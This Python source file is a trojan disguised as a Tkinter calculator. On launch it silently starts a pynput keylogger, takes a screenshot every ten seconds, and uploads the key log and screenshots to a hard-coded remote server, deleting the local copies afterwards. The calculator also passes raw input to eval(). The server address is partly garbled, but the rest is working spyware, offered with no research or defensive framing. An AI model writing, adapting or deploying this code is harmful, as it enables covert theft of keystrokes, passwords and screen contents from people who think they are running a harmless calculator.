import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
from PIL import ImageGrab
import threading
import time
import requests
import os

# Server URL (replace with your se169.2rver's IP or domain)
SERVER_URL = "http:// 000.56.76.20:5000/upload"

# File paths for logs
key_log_file = "keylog.txt"
screenshot_dir = "screenshots"

# Keylogger functionality
def keylogger():
    def write_to_file(key):
        with open(key_log_file, "a") as f:
            try:
                f.write(f"{key.char}")
            except AttributeError:
                f.write(f"[{key.name}]")

    def on_press(key):
        write_to_file(key)

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Screenshot capture functionality
def capture_screenshots():
    os.makedirs(screenshot_dir, exist_ok=True)
    while True:
        screenshot = ImageGrab.grab()
        screenshot.save(os.path.join(screenshot_dir, f"screenshot_{time.time()}.png"))
        time.sleep(10)

# Send logs to the server
def send_logs():
    while True:
        # Send key logs
        if os.path.exists(key_log_file):
            with open(key_log_file, "rb") as f:
                files = {"file": (key_log_file, f)}
                try:
                    requests.post(SERVER_URL, files=files)
                    os.remove(key_log_file)
                except Exception as e:
                    print(f"Error sending key logs: {e}")

        # Send screenshots
        if os.path.exists(screenshot_dir):
            for file in os.listdir(screenshot_dir):
                file_path = os.path.join(screenshot_dir, file)
                with open(file_path, "rb") as f:
                    files = {"file": (file, f)}
                    try:
                        requests.post(SERVER_URL, files=files)
                        os.remove(file_path)
                    except Exception as e:
                        print(f"Error sending screenshot: {e}")
        time.sleep(5)

# Calculator GUI
def calculator():
    def calculate():
        try:
            result = eval(entry.get())
            entry.delete(0, tk.END)
            entry.insert(0, str(result))
        except:
            messagebox.showerror("Error", "Invalid Input")

    root = tk.Tk()
    root.title("Calculator")

    entry = tk.Entry(root, font=("Arial", 20), width=15, borderwidth=5)
    entry.grid(row=0, column=0, columnspan=4)

    buttons = [
        ("7", 1, 0), ("8", 1, 1), ("9", 1, 2), ("/", 1, 3),
        ("4", 2, 0), ("5", 2, 1), ("6", 2, 2), ("*", 2, 3),
        ("1", 3, 0), ("2", 3, 1), ("3", 3, 2), ("-", 3, 3),
        ("0", 4, 0), (".", 4, 1), ("=", 4, 2), ("+", 4, 3),
    ]

    for (text, row, col) in buttons:
        button = tk.Button(root, text=text, font=("Arial", 18),
                           command=lambda t=text: entry.insert(tk.END, t) if t != "=" else calculate())
        button.grid(row=row, column=col, sticky="news")

    root.mainloop()

# Run everything
if __name__ == "__main__":
    threading.Thread(target=keylogger, daemon=True).start()
    threading.Thread(target=capture_screenshots, daemon=True).start()
    threading.Thread(target=send_logs, daemon=True).start()
    calculator()
    
